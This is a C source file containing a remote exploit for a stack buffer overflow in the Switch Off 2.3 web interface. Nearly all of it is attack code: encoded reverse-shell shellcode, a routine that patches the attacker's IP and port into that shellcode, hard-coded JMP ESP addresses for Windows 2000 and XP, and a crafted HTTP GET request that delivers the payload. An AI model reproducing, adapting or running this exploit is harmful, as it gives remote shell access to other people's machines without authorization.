/*******************************************************************/
/* [Crpt] Switch Off 2.3 exploit by MrNice [Crpt] */
/* --------------------------------------------------------------- */
/* */
/* Coder : MrNice */
/* Released on : 07/01/2004 */
/* Tested on : 2k Sp0 & Xp sp0 */
/* Advisory : www.securiteam.com/windowsntfocus/5BP011FBPI.html*/
/* Tech : The overflow can be caused by supplying an overly*/
/* long 'message' parameter to the application. */
/* */
/* If a password has been set, you will have to have*/
/* logged in to the server before issuing a */
/* malicious request to cause the overflow. */
/*******************************************************************/
/* www.coromputer.net && #coromputer on underet */
/******C***O***R***O***M***P***U***T***E***R*****2***0***0***4******/

#ifdef _WIN32
#include <winsock.h>
#include <windows.h>
#define close closesocket
#pragma comment (lib,"ws2_32")
#else
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//#define JMP_ESP_2K "\x1F\xE5\xC7\x77" //2k sp0 FR
//#define JMP_ESP_XP "\xE7\x80\x9C\x71" //xp pro sp0 FR

#define JMP_ESP_2K "\xB8\x64\x75\x71"
#define JMP_ESP_XP "\xC1\x1C\x35\x77"


char ReversShell[]= //Dexorer without call (ff..) coded by MrNice
"\x83\xEC\x50\xD9\xE1\xD9\x34\x24\x5B\x5B\x5B\x5B\x80\xEB\xE7\x33"
"\xC9\x66\x81\xC1\x4F\x01\x80\x33\x96\x43\xE2\xFA"
//Reverse Shell from Metasploit
"\x7e\xa6\x96\x96\x96\xd5\xdb\xd2\x96\x71\xef\x50\xef\x7a\x6f\x3c"
"\xf6\x4f\x9f\x63\x3b\x5d\x7b\x6a\xad\x18\xd8\x98\x7a\xe8\x4e\x74"
"\xe5\x3b\x4f\x93\x58\xe4\x68\x25\x80\xc1\xc5\xa4\xc9\xa5\xa4\xb8"
"\xd2\xda\xda\x96\x97\xcd\xc2\x1f\x73\x1f\xcb\x96\xfc\xa6\xcf\xf2"
"\x1d\x97\x1d\xd6\x9a\x1d\xe6\x8a\x3b\x1d\xce\x9e\x7d\x9a\x1b\xc1"
"\xb2\xc7\xc4\x69\x46\x1f\x55\xcf\x7d\x86\xfc\x9e\xc8\x97\x78\xfc"
"\x9e\xcf\x1d\xeb\x96\x16\x6f\x92\xe2\x72\xc7\xc5\x69\xa2\x19\x7e"
"\x15\x96\x96\x96\xcf\x1f\x92\x18\x74\x7d\xa7\x69\xf0\x17\x7a\x06"
"\x97\xc2\xfe\x97\x97\x96\x96\x69\xc3\x8e\xc1\xc1\xc1\xc1\xd1\xc1"
"\xd1\xc1\x69\xc3\x82\x1f\x55\xa7\x69\xfe\x56\x3e\x96\x61\xfe\x94"
"\x96\xb4\x87\x1f\x77\xfc\x86\xc7\xc5\x69\xc3\x86\x13\x56\xe3\xd2"
"\x1b\xaa\xb2\xa7\x56\xfc\x83\xcf\x65\x3d\x50\xd2\xb2\x86\xd2\x68"
"\xd2\xb2\xab\x1f\xca\xb2\xde\x1f\xca\xb2\xda\x1f\xca\xb2\xc6\x1b"
"\xd2\xb2\x86\xc2\xc6\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x69\xe3\x96"
"\xc7\x69\xc3\xbe\x1f\x77\xfe\x69\x69\x69\x69\x69\xa7\x69\xc3\xb2"
"\xc1\x69\xc3\x9a\x69\xc3\xb6\xc5\xc3\xc0\xc1\x1d\xfa\xb2\x8e\x1d"
"\xd3\xaa\x1d\xc2\x93\xee\x97\x7c\x1d\xdc\x8e\x1d\xcc\xb6\x97\x7d"
"\x75\xa4\xdf\x1d\xa2\x1d\x97\x78\xa7\x69\x6a\xa7\x56\x3a\xae\x76"
"\xe2\x91\x57\x59\x9b\x97\x51\x7d\x64\xad\xea\xb2\x82\xe3\x77\x1d"
"\xcc\xb2\x97\x7d\xf0\x1d\x9a\xdd\x1d\xcc\x8a\x97\x7d\x1d\x92\x1d"
"\x97\x7e\x7d\x94\xa7\x56\x1f\x7c\xc9\xc8\xcb\xcd\x54\x9e\x96";

  
//Fonction who set the shellcode coded by Kralor[crpt]
void set_sc(char *rhost, int rport, char *shellc0de)
   {
  unsigned int ip=0;
  unsigned short port=0;
  char *port_to_shell="",*ip1="";

  ip = inet_addr(rhost); ip1 = (char*)&ip;
  shellc0de[182]=ip1[0]^0x96;shellc0de[183]=ip1[1]^0x96;
  shellc0de[184]=ip1[2]^0x96; shellc0de[185]=ip1[3]^0x96;

  port = htons(rport);
  port_to_shell = (char *) &port;
  shellc0de[189]=port_to_shell[0]^0x96;
  shellc0de[190]=port_to_shell[1]^0x96;

   }

void banner()
   {
    printf("\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n");
  printf("\t\t www.coromputer.net && Undernet #coromputer\n");
        printf("\t---------------------------------------------------------------\n\n");
   }
   
void usage(char *exe)
   {
    printf("\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n");
  printf("\t\t www.coromputer.net && Undernet #coromputer\n");
        printf("\t---------------------------------------------------------------\n\n");
        printf("Syntax : %s <ip_vulnerable> <your_ip> <listening_port> <cible>\n",exe);
        printf("\nCible : \t0 - Windows 2000 (default)\n");
        printf("\t\t1 - Windows Xp\n\n");
        exit (-1);
   }
   
int main(int argc, char *argv[])
{
  int hsocket;

  struct hostent *host;
    struct in_addr adresseIP;
    struct sockaddr_in adressesocket;
   
    char BadString[700],Request[800];

  int i,len,cible=0;
  
  #ifdef _WIN32
  WSADATA wsaData;
  #endif
  
  if(argc<4)
     {
       usage(argv[0]);
   }
  
  if(argc>4)
     {
       cible=atoi(argv[4]);
     }
     
  banner();
  
  #ifdef _WIN32
    if(WSAStartup(0x101,&wsaData))
     {
    printf("[-] Unable to load winsock\n");
                exit (-1);
     }
  else
     {
       printf("[+] Winsock loaded\n");
     }
  #endif

  //Cr�ation de la socket
    if((hsocket=socket(AF_INET,SOCK_STREAM,0))==-1)
    {
    printf("[-] Can't creat Socket\n");
    exit (-1);
    }
  else
     {
    printf("[+] Socket created\n");
     }
   
   //GetHostByName()
   if((host=gethostbyname(argv[1]))==0)
   {
   printf("[-] Can't acquire remote info\n");
   close(hsocket);
   exit (-1);
   }
  else
     {
    printf("[+] Remote info Acquired\n");
     }

   memcpy(&adresseIP,host->h_addr,host->h_length);
  
   //Preparation de la struct sockaddr_in
   memset(&adressesocket,0,sizeof(struct sockaddr_in));
   adressesocket.sin_family=AF_INET;
   adressesocket.sin_port=htons(8000);
   memcpy(&adressesocket.sin_addr,host->h_addr,host->h_length);

  
   if(connect(hsocket,(struct sockaddr *)&adressesocket,sizeof(struct sockaddr_in))==-1)
   {
   printf("[-] Can't connect on %s:8000\n",argv[1]);
   close(hsocket);
   exit (-1);
   }
  else
     {
    printf("[+] Connected on %s:8000\n",argv[1]);
     }
  
  set_sc(argv[2], atoi(argv[3]),ReversShell);
  printf("[+] Reverse ShellCode built\n",argv[1]);
  
  for(i=0;i<700;i++)
     {
    BadString[i]=(char)0x90;
     }
     
  for(i=260;i<623;i++)
     {
    BadString[i]=ReversShell[i-260];
     }
     
  if(cible==0)
     {
    memcpy(&BadString[256],JMP_ESP_2K,4);
     }
  else
     {
       memcpy(&BadString[256],JMP_ESP_XP,4);
     }
     
  BadString[700]=0x00;
  
  memset(Request,'\x00',sizeof(Request));
  sprintf(Request,"GET /action.htm?action=SendMsg&message=%s HTTP/1.1\r\n"
      "Host: 10.0.0.6:8000\r\n"
      "\r\n",BadString);
        
  printf("[+] BadString constructed\n");
  
  if((len=send(hsocket,Request,strlen(Request),0))==-1)
      {
    printf("[-] Error on sending BadString\n");
      close(hsocket);
      exit (-1);
      }
     else
     {
     printf("[+] BadString Sended (%d)\n",len);
     }
  return 0;
   }

